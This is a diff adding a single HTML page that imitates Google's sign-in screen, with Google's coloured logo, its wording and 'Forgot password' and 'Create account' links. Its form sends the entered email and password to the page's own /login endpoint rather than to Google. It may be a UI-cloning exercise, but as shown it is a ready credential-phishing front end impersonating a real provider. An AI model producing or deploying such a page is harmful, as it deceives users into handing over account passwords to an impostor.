@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Sign In</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="login-box">
+        <div class="logo">
+            <span style="color: #4285F4;">G</span>
+            <span style="color: #EA4335;">o</span>
+            <span style="color: #FBBC05;">o</span>
+            <span style="color: #4285F4;">g</span>
+            <span style="color: #34A853;">l</span>
+            <span style="color: #EA4335;">e</span>
+        </div>
+        <h2>Sign in</h2>
+        <p>Use your Google Account</p>
+        
+        <form action="/login" method="POST">
+            <input type="email" name="email" placeholder="Email or phone" required>
+            <input type="password" name="password" placeholder="Enter your password" required>
+            <div class="footer-links">
+                <a href="#">Forgot password?</a>
+            </div>
+            <div class="buttons">
+                <a href="#" class="create-account">Create account</a>
+                <button type="submit" class="next-btn">Next</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
